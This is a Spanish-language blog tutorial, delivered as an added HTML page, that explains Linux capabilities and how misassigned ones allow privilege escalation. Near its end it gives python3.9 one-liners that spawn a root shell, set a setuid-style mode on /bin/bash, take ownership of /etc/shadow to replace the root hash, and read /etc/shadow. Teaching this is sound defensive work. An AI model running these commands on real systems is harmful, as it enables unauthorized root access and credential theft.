@@ -1,0 +1,716 @@
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Explotación de las Capabilities - Walxom Network</title>
+<meta name="description" content="Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.">
+
+
+  <meta name="author" content="Jose Salinas">
+  
+  <meta property="article:author" content="Jose Salinas">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="Walxom Network">
+<meta property="og:title" content="Explotación de las Capabilities">
+<meta property="og:url" content="http://localhost:4000/privesc/explotacion-de-las-capabilities/">
+
+
+  <meta property="og:description" content="Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.">
+
+
+
+  <meta property="og:image" content="https://i.ibb.co/Lt5fgcZ/explotacion-de-las-capabilities.png">
+
+
+
+  <meta name="twitter:site" content="@walxom">
+  <meta name="twitter:title" content="Explotación de las Capabilities">
+  <meta name="twitter:description" content="Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.">
+  <meta name="twitter:url" content="http://localhost:4000/privesc/explotacion-de-las-capabilities/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.ibb.co/Lt5fgcZ/explotacion-de-las-capabilities.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2022-01-12T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/privesc/explotacion-de-las-capabilities/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Walxom",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://github.com/walxom","https://twitter.com/walxom","https://www.linkedin.com/in/walxom","https://app.hackthebox.com/profile/685524"]
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Walxom Network Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Saltar a navegación principal</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Saltar a contenido</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Saltar a pie</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo"><img src="/assets/images/QR-code.png" alt="Walxom Network" style="pointer-events: none; user-select: none;"></a>
+        
+        <a class="site-title">
+          Walxom Network
+          <span class="site-subtitle">Don't limit yourself, think outside the box.</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Inicio</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Alternar búsqueda</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Alternar menú</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Jose Salinas" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Jose Salinas</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Entusiasta y apasionado a llevar la tecnología al límite.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Seguir</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">127.0.0.1</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+            <li><a href="https://twitter.com/walxom" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/walxom" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/walxom/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Explotación de las Capabilities">
+    <meta itemprop="description" content="Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.">
+    <meta itemprop="datePublished" content="2022-01-12T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Explotación de las Capabilities
+</h1>
+          
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> En esta página</h4></header>
+              <ul class="toc__menu"><li><a href="#qué-son-las-capabilities">¿Qué son las capabilities?</a></li><li><a href="#capabilites-sets">Capabilites Sets</a><ul><li><a href="#capinh-inherited-capabilities-heredadas">CapInh: Inherited capabilities (Heredadas)</a></li><li><a href="#capprm-permitted-capabilities-permitidas">CapPrm: Permitted capabilities (Permitidas)</a></li><li><a href="#capeff-effective-capabilities-efectivas">CapEff: Effective capabilities (Efectivas)</a></li><li><a href="#capbnd-bounding-capabilities-delimitación">CapBnd: Bounding capabilities (Delimitación)</a></li><li><a href="#capamb-ambient-capabilities-ambientales">CapAmb: Ambient capabilities (Ambientales)</a></li></ul></li><li><a href="#cómo-se-usan">¿Cómo se usan?</a></li><li><a href="#privesc--capabilities">PrivEsc / Capabilities</a><ul><li><a href="#cap_setuid">CAP_SETUID</a></li><li><a href="#cap_fowner">CAP_FOWNER</a></li><li><a href="#cap_chown">CAP_CHOWN</a></li><li><a href="#cap_dac_read_search">CAP_DAC_READ_SEARCH</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p>Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.</p>
+
+<p>La diferencia entre estos es que si tenemos un binario con permisos SUID y ejecutas el binario, directamente asumes el rol del propietario de forma temporal. Pero si el binario tiene asignado una capabilitie, solo se le permite ejecutar ciertas acciones privilegiadas, más no asumir el rol del propietario.</p>
+
+<h2 id="qué-son-las-capabilities">¿Qué son las capabilities?</h2>
+
+<p>Las capabilities son atributos especiales en el kernel de Linux que otorgan privilegios específicos a procesos y programas que normalmente están reservados para procesos cuyo UID sea 0.</p>
+
+<p>Lo bueno de las capabilities para un sysadmin es que con estas podemos dividir el poder de root, de modo que si se logra explotar un binario que tiene una o más capabilities, el daño que causara este será limitado, esto dependerá de las capabilities que le asignes.</p>
+
+<h2 id="capabilites-sets">Capabilites Sets</h2>
+
+<p>Cada subproceso tiene los siguientes conjuntos de capabilities que contienen cero o más:</p>
+
+<h3 id="capinh-inherited-capabilities-heredadas">CapInh: Inherited capabilities (Heredadas)</h3>
+
+<p>Con el Inherited (Heredado), se puede especificar todas las capabilities que se pueden heredar de un proceso principal.</p>
+
+<h3 id="capprm-permitted-capabilities-permitidas">CapPrm: Permitted capabilities (Permitidas)</h3>
+
+<p>Este es un superconjunto de capabilities que el subproceso puede agregar a los conjuntos de subprocesos permitidos o heredables.</p>
+
+<h3 id="capeff-effective-capabilities-efectivas">CapEff: Effective capabilities (Efectivas)</h3>
+
+<p>El CapEff representa todas las capabilities que el proceso está usando en este momento (este es el conjunto real de capabilities que el kernel usa para las comprobaciones de permisos).</p>
+
+<h3 id="capbnd-bounding-capabilities-delimitación">CapBnd: Bounding capabilities (Delimitación)</h3>
+
+<p>Con el Bounding (Delimitador), es posible restringir las capabilities que un proceso puede recibir.</p>
+
+<h3 id="capamb-ambient-capabilities-ambientales">CapAmb: Ambient capabilities (Ambientales)</h3>
+
+<p>La capabilitie Ambient (Ambientales) se aplica a todos los archivos binarios no SUID sin capabilities de archivo.</p>
+
+<h2 id="cómo-se-usan">¿Cómo se usan?</h2>
+
+<p>Hay varias capabilities para diferentes propósitos, esta es una lista de las más relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Capabilitie</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>CAP_SYS_TIME</strong></td>
+      <td>Configure el sistema y el reloj de hardware en tiempo real.</td>
+    </tr>
+    <tr>
+      <td><strong>CAP_KILL</strong></td>
+      <td>Evita comprobaciones de permisos para enviar señales.</td>
+    </tr>
+    <tr>
+      <td><strong>CAP_DAC_OVERRIDE</strong></td>
+      <td>Evita las revisiones de permisos sobre operaciones de lectura, escritura y ejecución.</td>
+    </tr>
+    <tr>
+      <td><strong>CAP_CHOWN</strong></td>
+      <td>Permite cambios arbitrarios en los IDs de usuario y de grupo los ficheros.</td>
+    </tr>
+    <tr>
+      <td><strong>CAP_NET_RAW</strong></td>
+      <td>Permite el uso de conectores de tipo RAW y PACKET.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Se puede asignar una capabilitie/s de las siguientes formas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>setcap cap_setuid+ep /usr/bin/python3.9
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>setcap cap_setuid,cap_chown+ep /usr/bin/python3.9
+</code></pre></div></div>
+
+<p>Podemos comprobar que capabilities tiene asignado el subproceso actualmente con: <code class="language-plaintext highlighter-rouge">grep "Cap" /proc/&lt;PID&gt;/status</code></p>
+
+<ul>
+  <li>Usuario <strong>normal</strong>:</li>
+</ul>
+
+<p><img src="https://i.ibb.co/Ksvk45F/User.png" alt="User" /></p>
+
+<ul>
+  <li>Usuario <strong>root</strong>:</li>
+</ul>
+
+<p><img src="https://i.ibb.co/7Rr4dzy/Root.png" alt="Root" /></p>
+
+<blockquote>
+  <p><strong>Nota:</strong> El <code class="language-plaintext highlighter-rouge">$$</code> contiene el PID de la shell que estamos ejecutando.</p>
+</blockquote>
+
+<p>Veremos números hexadecimales que con la utilidad <code class="language-plaintext highlighter-rouge">capsh</code>, podemos decodificarlos para obtener los nombres de las capabilities asignadas:</p>
+
+<p><img src="https://i.ibb.co/0Z51R7V/capsh.png" alt="capsh" class="acc" /></p>
+
+<p>También hay otra manera más fácil con <code class="language-plaintext highlighter-rouge">getpcaps &lt;PID&gt;</code>.</p>
+
+<p><img src="https://i.ibb.co/MPBDRRj/getpcaps.png" alt="getpcaps" class="acc" /></p>
+
+<p>Encontrar capabilities asignadas de forma recursiva desde la raíz:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Mostrar las capabilities asignadas en un archivo en específico:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>getcap /usr/bin/python3.9
+</code></pre></div></div>
+
+<p>Podemos remover las capabilities asignadas a un archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>setcap <span class="nt">-r</span> /usr/bin/python3.9
+</code></pre></div></div>
+
+<h2 id="privesc--capabilities">PrivEsc / Capabilities</h2>
+
+<p>Existe una lista muy larga de las capabilities que existen hoy en día, pero hay algunas en específicas que si le asignas a determinados programas puedes escalar privilegios de forma completa y obtener un shell como usuario root.</p>
+
+<blockquote>
+  <p><strong>Nota:</strong> Estas capabilities solo fueron asignadas a <code class="language-plaintext highlighter-rouge">python3.9</code> para que se les sea fácil entender, pero que quede en claro que este no es el único comando que se puede explotar.</p>
+</blockquote>
+
+<h3 id="cap_setuid">CAP_SETUID</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>python3.9 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+</code></pre></div></div>
+
+<h3 id="cap_fowner">CAP_FOWNER</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>python3.9 <span class="nt">-c</span> <span class="s1">'import os; os.chmod("/bin/bash",40001)'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
+</code></pre></div></div>
+
+<h3 id="cap_chown">CAP_CHOWN</h3>
+
+<p>Podemos asignarnos como propietario del archivo <code class="language-plaintext highlighter-rouge">/etc/shadow</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>python3.9 <span class="nt">-c</span> <span class="s1">'import os; os.chown("/etc/shadow",1000,1000)'</span>
+</code></pre></div></div>
+
+<p>Si grepeamos por <code class="language-plaintext highlighter-rouge">ENCRYPT</code> en fichero <code class="language-plaintext highlighter-rouge">/etc/login.defs</code>, podemos ver que método de encriptado usa:</p>
+
+<p><img src="https://i.ibb.co/JykvKhN/login-defs.png" alt="login.defs" class="acc" /></p>
+
+<p>para así generar una nueva contraseña con <code class="language-plaintext highlighter-rouge">openssl</code> y su encriptado correspondiente y remplazarlo para el usuario root. Puedes solicitar ayuda con <code class="language-plaintext highlighter-rouge">openssl passwd --help</code> para crear el tipo de hash para la contraseña.</p>
+
+<p>Ejemplo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>openssl passwd <span class="nt">-6</span>
+</code></pre></div></div>
+
+<h3 id="cap_dac_read_search">CAP_DAC_READ_SEARCH</h3>
+
+<p>Con esta capabilitie podemos leer cualquier archivo, en especial el <code class="language-plaintext highlighter-rouge">/etc/shadow</code> :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@debian:~<span class="nv">$ </span>python3.9 <span class="nt">-c</span> <span class="s1">'print(open("/etc/shadow","r").read())'</span>
+</code></pre></div></div>
+
+<p>Estas solo fueron algunas, en la página de <a href="https://gtfobins.github.io/">GTFOBins</a> puedes encontrar más comandos que puedes explotar con diferentes capabilities.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Etiquetas: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#capabilities" class="page__taxonomy-item" rel="tag">capabilities</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#privesc" class="page__taxonomy-item" rel="tag">privesc</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorías: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#privesc" class="page__taxonomy-item" rel="tag">PrivEsc</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Actualizado:</strong> <time datetime="2022-01-12T00:00:00+00:00">January 12, 2022</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Compartir en</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=walxom&text=Explotaci%C3%B3n+de+las+Capabilities%20http%3A%2F%2Flocalhost%3A4000%2Fprivesc%2Fexplotacion-de-las-capabilities%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fprivesc%2Fexplotacion-de-las-capabilities%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fprivesc%2Fexplotacion-de-las-capabilities%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/privesc/explotacion-de-un-path-hijacking/" class="pagination--pager" title="Explotación de un PATH Hijacking
+">Anterior</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Siguiente</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Puede que también te interese</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.ibb.co/kxjF9wz/path-hijacking.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/privesc/explotacion-de-un-path-hijacking/" rel="permalink">Explotación de un PATH Hijacking
+</a>
+      
+    </h2>
+    
+
+
+    <p class="archive__item-excerpt" itemprop="description">En los sistemas operativos hay un concepto llamado las variables de entorno, quizás algunos ya hayamos usado estos sin darnos cuenta, ya sea %AppData% para e...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.ibb.co/dPz847N/explotacion-de-tareas-cron.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/privesc/explotacion-de-tareas-cron/" rel="permalink">Explotación de tareas Cron
+</a>
+      
+    </h2>
+    
+
+
+    <p class="archive__item-excerpt" itemprop="description">A menudo hay formas de hacer las cosas de manera más rápida, como por ejemplo, las tareas. Algunos webmasters en vez de hacerlo manualmente prefieren ahorrar...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.ibb.co/bLwX9yS/explotacion-de-permisos-suid.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/privesc/explotacion-de-permisos-suid/" rel="permalink">Explotación de permisos SUID
+</a>
+      
+    </h2>
+    
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta.
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Términos de búsqueda...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Términos de búsqueda..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Seguir:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/walxom" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/walxom" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/walxom/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 Walxom. Funciona con <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
